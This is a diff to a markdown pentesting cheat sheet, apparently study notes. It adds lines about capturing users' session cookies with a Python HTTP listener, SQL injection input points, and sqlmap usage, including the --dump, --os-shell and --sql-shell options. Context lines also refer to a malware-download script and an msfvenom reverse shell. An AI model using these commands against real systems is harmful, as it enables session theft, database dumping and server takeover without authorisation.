@@ -363,6 +363,8 @@ For UDP use -sU
 ##### Listening with python http server
     python3 -m http.server <listening-port>
 
+Will allow to get the session cookies of users
+
 #### Malware download
 
     <script>var link = document.createElement('a');
@@ -378,6 +380,10 @@ Create a shell reversal with `msfvenom`
 ## SQL Injection
 ### Principle 
 Find any input which will be part of a SQL Query
+
+Inputs examples:
+  - Form field input
+  - URL parameter
 
 In the input vulnerable to SQL injection, insert:
 
@@ -414,17 +420,22 @@ Useful functions:
 
 ### Tool
 
-sqlmap  
-https://www.kali.org/tools/sqlmap/
+#### sqlmap  
+automatic SQL injection tool   
+https://www.kali.org/tools/sqlmap/  
+https://manpages.org/sqlmap
 
 sqlmap goal is to detect and take advantage of SQL injection vulnerabilities in web applications. Once it detects one or more SQL injections on the target host, the user can choose among a variety of options to perform an extensive back-end database management system fingerprint, retrieve DBMS session user and database, enumerate users, password hashes, privileges, databases, dump entire or user’s specific DBMS tables/columns, run his own SQL statement, read specific files on the file system and more.
 
-#### Usage
+##### Usage
 
     sqlmap -u "<page with sql inj. vuln>" --cookie "<session cookie>"
 
 Options:
  - `--dump` SQL dump of the database
+ - `--os-shell` Prompt for an interactive operating system shell  
+Needs to know which web application language the web server supports
+ - `--sql-shell` Prompt for an interactive SQL shell
 
 # Lexical
 ## Samba
